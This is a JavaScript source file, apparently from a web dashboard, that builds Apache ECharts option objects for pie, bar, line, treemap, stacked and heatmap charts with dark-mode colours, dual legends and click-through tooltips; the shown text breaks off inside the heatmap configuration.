var EChartsConfig = {

    // Default colors palette
    defaultColors: [
        '#a5b4fc', '#fca5a5', '#fdba74', '#38bdf8', '#a7f3d0',
        '#c084fc', '#fb7185', '#60a5fa', '#5eead4', '#22d3ee',
        '#f8b4cb', '#b4d8ff', '#c7d2fe', '#fde68a',
        '#d1d5db', '#e879f9', '#94a3b8', '#fcd34d',
        '#86efac', '#f472b6', '#818cf8', '#fb923c',
        '#a78bfa', '#4ade80', '#f59e0b', '#ec4899', '#06b6d4'
    ],

    isDarkMode: function() {
        return document.body.classList.contains('dark');
    },

    getTextColor: function() {
        return this.isDarkMode() ? '#e5e7eb' : '#374151';
    },

    getAxisLineColor: function() {
        return this.isDarkMode() ? '#4b5563' : '#d1d5db';
    },

    getSplitLineColor: function() {
        return this.isDarkMode() ? '#374151' : '#e5e7eb';
    },

    /** Shared: pie/donut data nodes from labels + data + urls */
    _mapPieData: function(labels, data, urls) {
        return labels.map(function(label, index) {
            return {
                name: label,
                value: data[index] || 0,
                url: urls && urls[index] ? urls[index] : null
            };
        });
    },

    /** Shared: tooltip / click URL check */
    _dataHasUrl: function(d) {
        return d && d.url && d.url !== '#';
    },

    /** Shared: axis tooltip for column/bar (identical formatter body) */
    _barColumnTooltipFormatter: function(urls) {
        return function(params) {
            var tooltip = '';
            for (var i = 0; i < params.length; i++) {
                var param = params[i];
                if (param.value > 0) {
                    tooltip += param.marker + ' ' + param.seriesName + ': ' + param.value + '<br/>';
                }
            }
            if (urls && urls.length > 0) {
                tooltip += '<i style="color: #999; font-size: 11px;">Click to view details</i>';
            }
            return tooltip;
        };
    },

    /** Shared: line/area axis tooltip formatter */
    _lineAreaTooltipFormatter: function() {
        return function(params) {
            if (!params || !params.length) return '';
            var tooltip = '<strong>' + params[0].axisValue + '</strong><br/>';
            for (var i = 0; i < params.length; i++) {
                var param = params[i];
                var v = param.data && typeof param.data === 'object' && param.data.value !== undefined
                    ? param.data.value
                    : param.value;
                var hasUrl = param.data && param.data.url && param.data.url !== '#';
                tooltip += param.marker + ' ' + param.seriesName + ': ' + v;
                if (hasUrl) {
                    tooltip += '<br/><i style="color: #999; font-size: 11px;">Click to view details</i>';
                }
                tooltip += '<br/>';
            }
            return tooltip;
        };
    },

    /** Shared: heatmap + radar legend selected merge */
    _mergeDualLegendSelected: function(catIds, serIds, sel) {
        var s = {};
        var i;
        for (i = 0; i < catIds.length; i++) s[catIds[i]] = true;
        for (i = 0; i < serIds.length; i++) s[serIds[i]] = true;
        if (sel) {
            for (var k in sel) {
                if (k.indexOf('__g_') === 0 || k.indexOf('__s_') === 0) {
                    s[k] = sel[k];
                }
            }
        }
        return s;
    },

    getChartBorderColor: function() {
        return this.isDarkMode() ? '#374151' : '#fff';
    },

    commonStyles: {
        fontFamily: "'Inter', sans-serif",
        fontSize: 12,
        legendFontSize: 12,
        axisFontSize: 11
    },

    getChartOption: function(config) {
        const { type, labels, data, colors, labelField, stackedData, hasMultipleGroups, urls } = config;
        const chartColors = this.defaultColors;

        this._currentUrls = urls || [];

        switch (type.toLowerCase()) {
            case 'pie':
                return this.getPieChartOption(labels, data, chartColors, labelField, urls);
            case 'donut':
                return this.getDonutChartOption(labels, data, chartColors, labelField, urls);
            case 'bar':
                return this.getBarChartOption(labels, data, chartColors, labelField, urls);
            case 'column':
                return this.getColumnChartOption(labels, data, chartColors, labelField, urls);
            case 'line':
                return this.getLineChartOption(labels, data, chartColors, labelField, urls);
            case 'funnel':
                return this.getFunnelChartOption(labels, data, chartColors, labelField, urls);
            case 'scatter':
                return this.getScatterChartOption(labels, data, chartColors, labelField, urls);
            case 'treemap':
                return this.getTreemapChartOption(labels, data, chartColors, labelField, urls);
            case 'area':
                return this.getAreaChartOption(labels, data, chartColors, labelField, urls);
            case 'stacked_vertical':
                return hasMultipleGroups ?
                    this.getStackedVerticalChartOption(stackedData, chartColors, labelField, urls) :
                    this.getColumnChartOption(labels, data, chartColors, labelField, urls);
            case 'stacked_horizontal':
                return hasMultipleGroups ?
                    this.getStackedHorizontalChartOption(stackedData, chartColors, labelField, urls) :
                    this.getBarChartOption(labels, data, chartColors, labelField, urls);
            case 'heatmap':
                return hasMultipleGroups && stackedData && stackedData.series && stackedData.series.length > 0 ?
                    this.getHeatmapChartOption(stackedData, chartColors, labelField, urls) :
                    this.getColumnChartOption(labels, data, chartColors, labelField, urls);
            case 'sankey':
                return hasMultipleGroups && stackedData && stackedData.series && stackedData.series.length > 0 ?
                    this.getSankeyChartOption(stackedData, chartColors, labelField, urls) :
                    this.getColumnChartOption(labels, data, chartColors, labelField, urls);
            case 'radar':
                if (hasMultipleGroups && stackedData && stackedData.categories && stackedData.series && stackedData.series.length > 0) {
                    return this.getRadarChartOptionFromStacked(stackedData, chartColors, labelField, urls);
                }
                return this.getRadarChartOption(labels, data, chartColors, labelField, urls);
            default:
                return this.getPieChartOption(labels, data, chartColors, labelField, urls);
        }
    },

    getLegendConfig: function(position = 'bottom') {
        return {
            show: true,
            type: 'scroll',
            orient: position === 'bottom' ? 'horizontal' : 'vertical',
            bottom: position === 'bottom' ? '0%' : undefined,
            left: position === 'bottom' ? 'center' : '0%',
            top: position === 'left' ? 'center' : undefined,
            itemWidth: 12,
            itemHeight: 12,
            textStyle: {
                fontSize: this.commonStyles.legendFontSize,
                fontFamily: this.commonStyles.fontFamily,
                color: this.getTextColor()
            }
        };
    },

    getGridConfig: function() {
        return {
            left: '3%',
            right: '4%',
            bottom: '22%',
            top: '10%',
            containLabel: true
        };
    },

    getAxisLabelStyle: function() {
        return {
            fontSize: this.commonStyles.axisFontSize,
            fontFamily: this.commonStyles.fontFamily,
            color: this.getTextColor()
        };
    },

    getAxisLineStyle: function() {
        return {
            lineStyle: {
                color: this.getAxisLineColor()
            }
        };
    },

    getSplitLineStyle: function() {
        return {
            show: true,
            lineStyle: {
                type: 'dashed',
                color: this.getSplitLineColor()
            }
        };
    },

    // Pie Chart Configuration
    getPieChartOption: function(labels, data, colors, labelField, urls) {
        var pieData = this._mapPieData(labels, data, urls);
        var self = this;

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'item',
                formatter: function(params) {
                    var hasUrl = self._dataHasUrl(params.data);
                    return params.seriesName + '<br/>' + params.name + ': ' + params.value + ' (' + params.percent + '%)' +
                        (hasUrl ? '<br/><i>Click to view details</i>' : '');
                }
            },
            legend: this.getLegendConfig(),
            color: colors,
            series: [{
                name: labelField,
                type: 'pie',
                radius: '65%',
                center: ['50%', '45%'],
                avoidLabelOverlap: false,
                itemStyle: {
                    borderRadius: 4,
                    borderColor: this.getChartBorderColor(),
                    borderWidth: 2
                },
                label: {
                    show: false
                },
                emphasis: {
                    label: {
                        show: true,
                        fontSize: 14,
                        fontWeight: 'bold',
                        color: this.getTextColor()
                    },
                    itemStyle: {
                        shadowBlur: 10,
                        shadowOffsetX: 0,
                        shadowColor: 'rgba(0, 0, 0, 0.5)'
                    }
                },
                labelLine: {
                    show: false
                },
                data: pieData
            }]
        };
    },

    // Donut Chart Configuration
    getDonutChartOption: function(labels, data, colors, labelField, urls) {
        var pieData = this._mapPieData(labels, data, urls);
        var self = this;

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'item',
                formatter: function(params) {
                    var hasUrl = self._dataHasUrl(params.data);
                    return params.seriesName + '<br/>' + params.name + ': ' + params.value + ' (' + params.percent + '%)' +
                        (hasUrl ? '<br/><i style="color: #999; font-size: 11px;">Click to view details</i>' : '');
                }
            },
            legend: this.getLegendConfig(),
            color: colors,
            series: [{
                name: labelField,
                type: 'pie',
                radius: ['40%', '70%'],
                center: ['50%', '45%'],
                avoidLabelOverlap: false,
                itemStyle: {
                    borderRadius: 6,
                    borderColor: this.getChartBorderColor(),
                    borderWidth: 2
                },
                label: {
                    show: false
                },
                emphasis: {
                    label: {
                        show: true,
                        fontSize: 14,
                        fontWeight: 'bold',
                        color: this.getTextColor()
                    },
                    itemStyle: {
                        shadowBlur: 10,
                        shadowOffsetX: 0,
                        shadowColor: 'rgba(0, 0, 0, 0.5)'
                    }
                },
                labelLine: {
                    show: false
                },
                data: pieData
            }]
        };
    },

    // Column Chart Configuration
    getColumnChartOption: function(labels, data, colors, labelField, urls) {
        const series = labels.map((label, index) => ({
            name: label,
            type: 'bar',
            data: [data[index] || 0],
            itemStyle: {
                color: colors[index % colors.length],
                borderRadius: [4, 4, 0, 0]
            }
        }));

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'axis',
                axisPointer: { type: 'shadow' },
                formatter: this._barColumnTooltipFormatter(urls)
            },
            legend: {
                ...this.getLegendConfig(),
                show: true,
                type: 'scroll'
            },
            grid: this.getGridConfig(),
            xAxis: {
                type: 'category',
                data: [labelField],
                axisLabel: this.getAxisLabelStyle(),
                axisLine: this.getAxisLineStyle()
            },
            yAxis: {
                type: 'value',
                axisLabel: this.getAxisLabelStyle(),
                axisLine: this.getAxisLineStyle(),
                splitLine: this.getSplitLineStyle()
            },
            color: colors,
            series: series
        };
    },

    // Bar Chart Configuration
    getBarChartOption: function(labels, data, colors, labelField, urls) {
        const series = labels.map((label, index) => ({
            name: label,
            type: 'bar',
            data: [data[index] || 0],
            itemStyle: {
                color: colors[index % colors.length],
                borderRadius: [0, 4, 4, 0]
            }
        }));

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'axis',
                axisPointer: { type: 'shadow' },
                formatter: this._barColumnTooltipFormatter(urls)
            },
            legend: {
                ...this.getLegendConfig(),
                show: true,
                type: 'scroll'
            },
            grid: this.getGridConfig(),
            xAxis: {
                type: 'value',
                axisLabel: this.getAxisLabelStyle(),
                axisLine: this.getAxisLineStyle(),
                splitLine: this.getSplitLineStyle()
            },
            yAxis: {
                type: 'category',
                data: [labelField],
                axisLabel: this.getAxisLabelStyle(),
                axisLine: this.getAxisLineStyle()
            },
            color: colors,
            series: series
        };
    },

    // Line chart
    getLineChartOption: function(labels, data, colors, labelField, urls) {
        const lineData = labels.map(function(value, index) {
            const v = data[index] != null ? Number(data[index]) || 0 : 0;
            const item = { value: v };
            if (urls && urls[index]) {
                item.url = urls[index];
            }
            return item;
        });
        const primaryColor = this.defaultColors[0];

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'axis',
                formatter: this._lineAreaTooltipFormatter()
            },
            legend: {
                ...this.getLegendConfig(),
                show: true,
                type: 'scroll'
            },
            grid: this.getGridConfig(),
            xAxis: {
                type: 'category',
                data: labels,
                boundaryGap: false,
                axisLabel: {
                    ...this.getAxisLabelStyle(),
                    rotate: labels.some(function(l) { return String(l).length > 8; }) ? 45 : 0
                },
                axisLine: this.getAxisLineStyle()
            },
            yAxis: {
                type: 'value',
                axisLabel: this.getAxisLabelStyle(),
                axisLine: this.getAxisLineStyle(),
                splitLine: this.getSplitLineStyle()
            },
            color: this.defaultColors,
            series: [{
                name: labelField || 'Series',
                type: 'line',
                data: lineData,
                smooth: true,
                symbol: 'circle',
                symbolSize: 6,
                showSymbol: true,
                lineStyle: {
                    width: 3,
                    color: primaryColor
                },
                itemStyle: {
                    color: primaryColor
                }
            }]
        };
    },

    // Funnel Chart Configuration
    getFunnelChartOption: function(labels, data, colors, labelField, urls) {
        var funnelData = this._mapPieData(labels, data, urls);
        var self = this;

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'item',
                formatter: function(params) {
                    var hasUrl = self._dataHasUrl(params.data);
                    return params.seriesName + '<br/>' + params.name + ': ' + params.value +
                        (hasUrl ? '<br/><i>Click to view details</i>' : '');
                }
            },
            legend: this.getLegendConfig(),
            color: colors,
            series: [{
                name: labelField,
                type: 'funnel',
                left: '10%',
                top: '5%',
                width: '80%',
                height: '70%',
                min: 0,
                max: Math.max(...data),
                minSize: '0%',
                maxSize: '100%',
                sort: 'descending',
                gap: 2,
                label: {
                    show: true,
                    position: 'inside',
                    fontSize: 12,
                    fontFamily: this.commonStyles.fontFamily,
                    color: this.getTextColor()
                },
                labelLine: {
                    length: 10,
                    lineStyle: {
                        width: 1,
                        type: 'solid'
                    }
                },
                itemStyle: {
                    borderColor: this.getChartBorderColor(),
                    borderWidth: 1
                },
                emphasis: {
                    label: {
                        fontSize: 14,
                        color: this.getTextColor()
                    }
                },
                data: funnelData
            }]
        };
    },

    // Scatter Chart Configuration
    getScatterChartOption: function(labels, data, colors, labelField, urls) {
        const series = labels.map((label, index) => ({
            name: label,
            type: 'scatter',
            data: [[index, data[index] || 0]],
            symbolSize: function(data) {
                return Math.sqrt(data[1]) * 2 + 10;
            },
            itemStyle: {
                color: colors[index % colors.length],
                opacity: 0.8
            },
            emphasis: {
                focus: 'series',
                itemStyle: {
                    opacity: 1
                }
            }
        }));

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'item',
                formatter: function(params) {
                    const hasUrl = params.data[2] && params.data[2] !== '#';
                    return `${params.seriesName}: ${params.data[1]}${hasUrl ? '<br/><i style="color: #999; font-size: 11px;">Click to view details</i>' : ''}`;
                }
            },
            legend: {
                ...this.getLegendConfig(),
                show: true,
                type: 'scroll'
            },
            grid: this.getGridConfig(),
            xAxis: {
                type: 'category',
                data: labels,
                axisLabel: {
                    ...this.getAxisLabelStyle(),
                    rotate: labels.some(label => label.length > 8) ? 45 : 0
                },
                axisLine: this.getAxisLineStyle()
            },
            yAxis: {
                type: 'value',
                axisLabel: this.getAxisLabelStyle(),
                axisLine: this.getAxisLineStyle(),
                splitLine: this.getSplitLineStyle()
            },
            color: colors,
            series: series
        };
    },

    // Treemap Chart Configuration
    getTreemapChartOption: function(labels, data, colors, labelField, urls) {
        const palette = this.defaultColors;
        const treemapData = labels.map((label, index) => ({
            name: label,
            value: Math.max(0, Number(data[index]) || 0),
            url: urls && urls[index] ? urls[index] : null,
            itemStyle: {
                color: palette[index % palette.length],
                borderColor: this.getChartBorderColor(),
                borderWidth: 1
            }
        }));

        const legendSeries = labels.map(function(label, index) {
            return {
                name: String(label),
                type: 'bar',
                xAxisIndex: 0,
                yAxisIndex: 0,
                data: [0],
                barWidth: 0,
                barGap: '-100%',
                tooltip: { show: false },
                itemStyle: {
                    color: palette[index % palette.length]
                },
                emphasis: { disabled: true }
            };
        });

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'item',
                formatter: function(params) {
                    if (params.seriesType === 'bar') return '';
                    const d = params.data;
                    const hasUrl = d && d.url && d.url !== '#';
                    return (
                        (params.treePathInfo && params.treePathInfo.length
                            ? params.treePathInfo.map(function(p) { return p.name; }).join(' / ')
                            : params.name) +
                        '<br/>' +
                        (labelField ? labelField + ': ' : '') +
                        params.value +
                        (hasUrl ? '<br/><i style="color: #999; font-size: 11px;">Click to view details</i>' : '')
                    );
                }
            },
            legend: {
                ...this.getLegendConfig(),
                show: labels.length > 0,
                type: 'scroll',
                data: labels.map(function(l) { return String(l); }),
                selectedMode: true
            },
            color: palette,
            grid: {
                left: -1000,
                top: -1000,
                width: 1,
                height: 1,
                show: false
            },
            xAxis: [{
                type: 'category',
                data: [''],
                show: false
            }],
            yAxis: [{
                type: 'value',
                show: false,
                max: 1
            }],
            series: legendSeries.concat([{
                id: 'treemap-main',
                name: labelField || 'Treemap',
                type: 'treemap',
                width: '100%',
                height: '85%',
                top: '2%',
                roam: false,
                nodeClick: false,
                breadcrumb: {
                    show: false
                },
                label: {
                    show: true,
                    formatter: '{b}',
                    fontSize: 11,
                    fontFamily: this.commonStyles.fontFamily,
                    color: this.getTextColor()
                },
                upperLabel: {
                    show: false
                },
                itemStyle: {
                    borderColor: this.getChartBorderColor(),
                    borderWidth: 1,
                    gapWidth: 2
                },
                emphasis: {
                    itemStyle: {
                        shadowBlur: 10,
                        shadowColor: 'rgba(0, 0, 0, 0.25)'
                    },
                    label: {
                        fontSize: 12,
                        fontWeight: 'bold'
                    }
                },
                data: treemapData
            }])
        };
    },

    // Area Chart Configuration (filled line / area under curve)
    getAreaChartOption: function(labels, data, colors, labelField, urls) {
        const areaData = data.map((value, index) => ({
            value: value,
            url: urls && urls[index] ? urls[index] : null
        }));
        const primaryColor = this.defaultColors[0];

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'axis',
                formatter: this._lineAreaTooltipFormatter()
            },
            legend: {
                ...this.getLegendConfig(),
                show: true,
                type: 'scroll'
            },
            grid: this.getGridConfig(),
            xAxis: {
                type: 'category',
                boundaryGap: false,
                data: labels,
                axisLabel: {
                    ...this.getAxisLabelStyle(),
                    rotate: labels.some(function(label) { return String(label).length > 8; }) ? 45 : 0
                },
                axisLine: this.getAxisLineStyle()
            },
            yAxis: {
                type: 'value',
                axisLabel: this.getAxisLabelStyle(),
                axisLine: this.getAxisLineStyle(),
                splitLine: this.getSplitLineStyle()
            },
            color: this.defaultColors,
            series: [{
                name: labelField,
                type: 'line',
                data: areaData,
                smooth: true,
                symbol: 'circle',
                symbolSize: 6,
                showSymbol: true,
                lineStyle: {
                    width: 2,
                    color: primaryColor
                },
                itemStyle: {
                    color: primaryColor
                },
                areaStyle: {
                    color: primaryColor,
                    opacity: this.isDarkMode() ? 0.35 : 0.45
                }
            }]
        };
    },

    _phantomLegendGrid: function() {
        return {
            grid: { left: -1000, top: -1000, width: 1, height: 1, show: false },
            xAxis: [{ type: 'category', data: [''], show: false }],
            yAxis: [{ type: 'value', show: false, max: 1 }]
        };
    },

    filterStackedDataByCategories: function(stackedData, selected) {
        if (!stackedData || !stackedData.categories || !stackedData.series) return stackedData;
        var categories = stackedData.categories;
        var keepIdx = [];
        for (var i = 0; i < categories.length; i++) {
            var key = '__g_' + i + '__';
            if (selected && selected[key] === false) continue;
            keepIdx.push(i);
        }
        if (keepIdx.length === 0) return { categories: [], series: stackedData.series.map(function(s) { return { name: s.name, data: [] }; }) };
        var newCategories = keepIdx.map(function(i) { return categories[i]; });
        var newSeries = stackedData.series.map(function(s) {
            var row = s.data || [];
            return {
                name: s.name,
                data: keepIdx.map(function(i) { return row[i]; })
            };
        });
        return { categories: newCategories, series: newSeries };
    },

    getStackedVerticalChartOption: function(stackedData, colors, labelField, urls, opts) {
        if (!stackedData || !stackedData.categories || !stackedData.series || stackedData.series.length === 0) {
            return this.getColumnChartOption(['No Data'], [0], this.defaultColors, labelField);
        }

        opts = opts || {};
        const palette = this.defaultColors;
        const categories = stackedData.categories;
        const originalCats = (opts.originalStackedData && opts.originalStackedData.categories) || categories;
        const catIds = originalCats.map(function(_, i) { return '__g_' + i + '__'; });
        const catLabelById = {};
        originalCats.forEach(function(c, i) { catLabelById[catIds[i]] = String(c); });

        const phantomCats = catIds.map(function(id, index) {
            return {
                name: id,
                type: 'bar',
                gridIndex: 0,
                xAxisIndex: 0,
                yAxisIndex: 0,
                data: [0],
                barWidth: 0,
                barGap: '-100%',
                tooltip: { show: false },
                itemStyle: { color: palette[index % palette.length] },
                emphasis: { disabled: true }
            };
        });

        const series = stackedData.series.map((seriesItem, index) => ({
            name: seriesItem.name,
            type: 'bar',
            stack: 'total',
            data: seriesItem.data,
            barWidth: '60%',
            itemStyle: {
                borderRadius: index === stackedData.series.length - 1 ? [4, 4, 0, 0] : [0, 0, 0, 0]
            },
            emphasis: {
                focus: 'series'
            }
        }));

        const legendBase = this.getLegendConfig();
        const seriesNames = stackedData.series.map(function(s) { return s.name; });
        const dualLegend = [
            {
                ...legendBase,
                show: catIds.length > 0,
                type: 'scroll',
                data: catIds,
                selectedMode: true,
                top: '0%',
                bottom: undefined,
                left: 'center',
                formatter: function(name) { return catLabelById[name] != null ? catLabelById[name] : name; },
                selected: opts.legendSelected ? (function() {
                    var s = {};
                    catIds.forEach(function(id) {
                        if (opts.legendSelected[id] !== undefined) s[id] = opts.legendSelected[id];
                    });
                    return Object.keys(s).length ? s : undefined;
                })() : undefined
            },
            {
                ...legendBase,
                show: true,
                type: 'scroll',
                data: seriesNames,
                selectedMode: true,
                bottom: '0%',
                top: undefined,
                left: 'center',
                selected: opts.legendSelected ? (function() {
                    var s = {};
                    seriesNames.forEach(function(n) {
                        if (opts.legendSelected[n] !== undefined) s[n] = opts.legendSelected[n];
                    });
                    return Object.keys(s).length ? s : undefined;
                })() : undefined
            }
        ];
        const phantom = this._phantomLegendGrid();
        const mainGrid = { ...this.getGridConfig(), top: '12%', bottom: '20%' };

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'axis',
                axisPointer: {
                    type: 'shadow'
                },
                formatter: function(params) {
                    if (!params || !params.length) return '';
                    if (params[0].seriesType === 'bar' && params[0].seriesName && params[0].seriesName.indexOf('__g_') === 0) return '';
                    let tooltip = `<strong>${params[0].axisValue}</strong><br/>`;
                    let total = 0;
                    params.forEach(param => {
                        const v = param.data && typeof param.data === 'object' && param.data.value !== undefined
                            ? param.data.value
                            : param.value;
                        const hasUrl = param.data && param.data.url && param.data.url !== '#';
                        tooltip += `${param.marker} ${param.seriesName}: ${v}${hasUrl ? '<br/><i style="color: #999; font-size: 11px;">Click to view details</i>' : ''}<br/>`;
                        total += Number(v) || 0;
                    });
                    tooltip += `<strong>Total: ${total}</strong>`;
                    return tooltip;
                }
            },
            legend: dualLegend,
            grid: [phantom.grid, mainGrid],
            xAxis: [
                phantom.xAxis[0],
                {
                gridIndex: 1,
                type: 'category',
                data: stackedData.categories,
                axisLabel: {
                    ...this.getAxisLabelStyle(),
                    rotate: stackedData.categories.some(cat => cat.length > 8) ? 45 : 0
                },
                axisTick: {
                    show: false
                },
                axisLine: this.getAxisLineStyle()
            }
            ],
            yAxis: [
                phantom.yAxis[0],
                {
                gridIndex: 1,
                type: 'value',
                axisLabel: this.getAxisLabelStyle(),
                axisLine: this.getAxisLineStyle(),
                splitLine: this.getSplitLineStyle()
            }
            ],
            color: palette,
            series: phantomCats.concat(series.map(function(s) {
                s.gridIndex = 1;
                s.xAxisIndex = 1;
                s.yAxisIndex = 1;
                return s;
            }))
        };
    },

    // Stacked Horizontal Chart Configuration (dual legend when two groups)
    getStackedHorizontalChartOption: function(stackedData, colors, labelField, urls, opts) {
        if (!stackedData || !stackedData.categories || !stackedData.series || stackedData.series.length === 0) {
            return this.getBarChartOption(['No Data'], [0], this.defaultColors, labelField);
        }

        opts = opts || {};
        const palette = this.defaultColors;
        const categories = stackedData.categories;
        const originalCats = (opts.originalStackedData && opts.originalStackedData.categories) || categories;
        const catIds = originalCats.map(function(_, i) { return '__g_' + i + '__'; });
        const catLabelById = {};
        originalCats.forEach(function(c, i) { catLabelById[catIds[i]] = String(c); });

        const phantomCats = catIds.map(function(id, index) {
            return {
                name: id,
                type: 'bar',
                gridIndex: 0,
                xAxisIndex: 0,
                yAxisIndex: 0,
                data: [0],
                barWidth: 0,
                barGap: '-100%',
                tooltip: { show: false },
                itemStyle: { color: palette[index % palette.length] },
                emphasis: { disabled: true }
            };
        });

        const series = stackedData.series.map((seriesItem, index) => ({
            name: seriesItem.name,
            type: 'bar',
            stack: 'total',
            data: seriesItem.data,
            barWidth: '60%',
            itemStyle: {
                borderRadius: index === stackedData.series.length - 1 ? [0, 4, 4, 0] : [0, 0, 0, 0]
            },
            emphasis: {
                focus: 'series'
            }
        }));

        const legendBase = this.getLegendConfig();
        const seriesNamesH = stackedData.series.map(function(s) { return s.name; });
        const dualLegend = [
            {
                ...legendBase,
                show: catIds.length > 0,
                type: 'scroll',
                data: catIds,
                selectedMode: true,
                top: '0%',
                bottom: undefined,
                left: 'center',
                formatter: function(name) { return catLabelById[name] != null ? catLabelById[name] : name; },
                selected: opts.legendSelected ? (function() {
                    var s = {};
                    catIds.forEach(function(id) {
                        if (opts.legendSelected[id] !== undefined) s[id] = opts.legendSelected[id];
                    });
                    return Object.keys(s).length ? s : undefined;
                })() : undefined
            },
            {
                ...legendBase,
                show: true,
                type: 'scroll',
                data: seriesNamesH,
                selectedMode: true,
                bottom: '0%',
                top: undefined,
                left: 'center',
                selected: opts.legendSelected ? (function() {
                    var s = {};
                    seriesNamesH.forEach(function(n) {
                        if (opts.legendSelected[n] !== undefined) s[n] = opts.legendSelected[n];
                    });
                    return Object.keys(s).length ? s : undefined;
                })() : undefined
            }
        ];
        const phantom = this._phantomLegendGrid();
        const mainGrid = { ...this.getGridConfig(), left: '8%', top: '12%', bottom: '20%' };

        return {
            ...this.getAnimationConfig(),
            tooltip: {
                trigger: 'axis',
                axisPointer: { type: 'shadow' },
                formatter: function(params) {
                    if (!params || !params.length) return '';
                    if (params[0].seriesName && params[0].seriesName.indexOf('__g_') === 0) return '';
                    let tooltip = `<strong>${params[0].axisValue}</strong><br/>`;
                    let total = 0;
                    params.forEach(function(param) {
                        const v = param.data && typeof param.data === 'object' && param.data.value !== undefined
                            ? param.data.value : param.value;
                        const hasUrl = param.data && param.data.url && param.data.url !== '#';
                        tooltip += `${param.marker} ${param.seriesName}: ${v}${hasUrl ? '<br/><i style="color: #999; font-size: 11px;">Click to view details</i>' : ''}<br/>`;
                        total += Number(v) || 0;
                    });
                    tooltip += `<strong>Total: ${total}</strong>`;
                    return tooltip;
                }
            },
            legend: dualLegend,
            grid: [phantom.grid, mainGrid],
            xAxis: [
                phantom.xAxis[0],
                {
                gridIndex: 1,
                type: 'value',
                axisLabel: this.getAxisLabelStyle(),
                axisLine: this.getAxisLineStyle(),
                splitLine: this.getSplitLineStyle()
            }
            ],
            yAxis: [
                phantom.yAxis[0],
                {
                gridIndex: 1,
                type: 'category',
                data: stackedData.categories,
                axisLabel: this.getAxisLabelStyle(),
                axisTick: { show: false },
                axisLine: this.getAxisLineStyle()
            }
            ],
            color: palette,
            series: phantomCats.concat(series.map(function(s) {
                s.gridIndex = 1;
                s.xAxisIndex = 1;
                s.yAxisIndex = 1;
                return s;
            }))
        };
    },


    buildHeatmapData: function(stackedData, selected) {
        const categories = stackedData.categories;
        const seriesList = stackedData.series;
        const keepI = [];
        const keepJ = [];
        for (let i = 0; i < categories.length; i++) {
            if (selected && selected['__g_' + i + '__'] === false) continue;
            keepI.push(i);
        }
        for (let j = 0; j < seriesList.length; j++) {
            if (selected && selected['__s_' + j + '__'] === false) continue;
            keepJ.push(j);
        }
        if (keepI.length === 0 || keepJ.length === 0) {
            return { categories: [], yNames: [], heatData: [], maxVal: 0 };
        }
        const newCategories = keepI.map(function(i) { return categories[i]; });
        const newYNames = keepJ.map(function(j) { return seriesList[j].name; });
        const heatData = [];
        let maxVal = 0;
        for (let jj = 0; jj < keepJ.length; jj++) {
            const j = keepJ[jj];
            const row = seriesList[j].data || [];
            for (let ii = 0; ii < keepI.length; ii++) {
                const i = keepI[ii];
                const raw = row[i];
                const v = typeof raw === 'object' && raw !== null && raw.value !== undefined
                    ? Number(raw.value) || 0
                    : Number(raw) || 0;
                const cellUrl = typeof raw === 'object' && raw !== null && raw.url ? raw.url : null;
                if (v > maxVal) maxVal = v;
                if (cellUrl) {
                    heatData.push([ii, jj, v, cellUrl]);
                } else {
                    heatData.push([ii, jj, v]);
                }
            }
        }
        return { categories: newCategories, yNames: newYNames, heatData: heatData, maxVal: maxVal };
    },

    // Heatmap Configuration
    getHeatmapChartOption: function(stackedData, colors, labelField, urls, opts) {
        if (!stackedData || !stackedData.categories || !stackedData.series || stackedData.series.length === 0) {
            return this.getColumnChartOption(['No Data'], [0], this.defaultColors, labelField);
        }

        opts = opts || {};
        const originalStacked = opts.originalStackedData || stackedData;
        const originalCats = originalStacked.categories;
        const originalSeries = originalStacked.series;
        const originalYNames = originalSeries.map(function(s) { return s.name; });

        const built = this.buildHeatmapData(originalStacked, opts.legendSelected || null);
        let categories = built.categories;
        let yNames = built.yNames;
        let heatData = built.heatData;
        let maxVal = built.maxVal;
        if (categories.length === 0 || yNames.length === 0) {
            return this.getColumnChartOption(['No Data'], [0], this.defaultColors, labelField);
        }

        const catIds = originalCats.map(function(_, i) { return '__g_' + i + '__'; });
        const serIds = originalYNames.map(function(_, j) { return '__s_' + j + '__'; });

        const textColor = this.getTextColor();
        const isDark = this.isDarkMode();
        const heatmapColors = isDark
            ? ['#fca5a5', '#f9a8a2', '#c4b5fd', '#a5b4fc', '#818cf8']
            : ['#fca5a5', '#fbcfe8', '#ddd6fe', '#a5b4fc'];
        const heatmapBg = isDark ? '#111827' : '#f8fafc';
        const palette = this.defaultColors;
        const catLabelById = {};
        originalCats.forEach(function(c, i) { catLabelById[catIds[i]] = String(c); });
        const serLabelById = {};
        originalYNames.forEach(function(n, j) { serLabelById[serIds[j]] = String(n); });
        const phantom = this._phantomLegendGrid();
        const phantomCats = catIds.map(function(id, index) {
            return {
                name: id, type: 'bar', gridIndex: 0, xAxisIndex: 0, yAxisIndex: 0,
                data: [0], barWidth: 0, barGap: '-100%', tooltip: { show: false },
                itemStyle: { color: palette[index % palette.length] }, emphasis: { disabled: true }
            };
        });
        const phantomSeries = serIds.map(function(id, index) {
            return {
                name: id, type: 'bar', gridIndex: 0, xAxisIndex: 0, yAxisIndex: 0,
                data: [0], barWidth: 0, barGap: '-100%', tooltip: { show: false },
                itemStyle: { color: palette[(index + catIds.length) % palette.length] }, emphasis: { disabled: true }
            };
        });
        const legendBase = this.getLegendConfig();
        const legendSelectedFull = this._mergeDualLegendSelected(catIds, serIds, opts.legendSelected);
        const heatmapDualLegend = [
            {
                ...legendBase,
                show: catIds.length > 0,
                type: 'scroll',
                data: catIds,
                selectedMode: true,
                top: '1%',
                bottom: undefined,
                left: 'center',
                formatter: function(name) { return catLabelById[name] != null ? catLabelById[name] : name; },
                selected: legendSelectedFull
            },
            {
                ...legendBase,
                show: serIds.length > 0,
                type: 'scroll',
                data: serIds,
                selectedMode: true,
                bottom: '0%',
                top: undefined,
                left: 'center',
                formatter: function(name) { return serLabelById[name] != null ? serLabelById[name] : name; },
                selected: legendSelectedFull
            }
        ];

        return {
            ...this.getAnimationConfig(),
            backgroundColor: heatmapBg,
